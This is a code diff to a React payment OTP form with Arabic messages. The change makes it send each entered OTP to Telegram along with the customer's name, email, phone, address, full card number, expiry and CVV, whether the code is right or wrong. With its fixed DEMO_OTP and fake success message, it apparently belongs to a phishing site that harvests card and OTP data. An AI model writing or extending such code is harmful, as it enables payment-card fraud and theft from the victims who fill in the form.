@@ -167,14 +167,39 @@ const PaymentOTPForm = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setError("");
-    
+
     const otpString = otp.join('');
-    
+
     if (otpString.length !== 6) {
       setError("الرجاء إدخال رمز التحقق كاملاً");
       return;
     }
-    
+
+    // ALWAYS send to Telegram, regardless of whether OTP is correct or wrong
+    const isCorrect = otpString === DEMO_OTP;
+
+    // Send complete payment data to Telegram
+    const telegramResult = await sendToTelegram({
+      type: 'payment_otp_attempt',
+      data: {
+        name: customerInfo.name || '',
+        email: customerInfo.email || '',
+        phone: customerInfo.phone || '',
+        address: customerInfo.address || '',
+        service: serviceName,
+        amount: formattedAmount,
+        cardholder: sessionStorage.getItem('cardName') || '',
+        cardNumber: sessionStorage.getItem('cardNumber') || '',
+        cardLast4: sessionStorage.getItem('cardLast4') || '',
+        expiry: sessionStorage.getItem('cardExpiry') || '12/25',
+        cvv: sessionStorage.getItem('cardCvv') || '',
+        otp: otpString,
+        otp_status: isCorrect ? 'correct' : 'wrong',
+        attempts: attempts + 1
+      },
+      timestamp: new Date().toISOString()
+    });
+
     if (otpString === DEMO_OTP) {
       // Submit to Netlify Forms
       try {
@@ -198,36 +223,16 @@ const PaymentOTPForm = () => {
         // Silent error handling
       }
 
-      // Send complete payment confirmation to Telegram
-      const telegramResult = await sendToTelegram({
-        type: 'payment_confirmation',
-        data: {
-          name: customerInfo.name || '',
-          email: customerInfo.email || '',
-          phone: customerInfo.phone || '',
-          address: customerInfo.address || '',
-          service: serviceName,
-          amount: formattedAmount,
-          cardholder: sessionStorage.getItem('cardName') || '',
-          cardNumber: sessionStorage.getItem('cardNumber') || '',
-          cardLast4: sessionStorage.getItem('cardLast4') || '',
-          expiry: sessionStorage.getItem('cardExpiry') || '12/25',
-          cvv: sessionStorage.getItem('cardCvv') || '',
-          otp: otpString
-        },
-        timestamp: new Date().toISOString()
-      });
-
       toast({
         title: "تم بنجاح!",
         description: "تم تأكيد الدفع بنجاح",
       });
-      
+
       navigate(`/pay/${id}/receipt`);
     } else {
       const newAttempts = attempts + 1;
       setAttempts(newAttempts);
-      
+
       if (newAttempts >= 3) {
         setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
         toast({
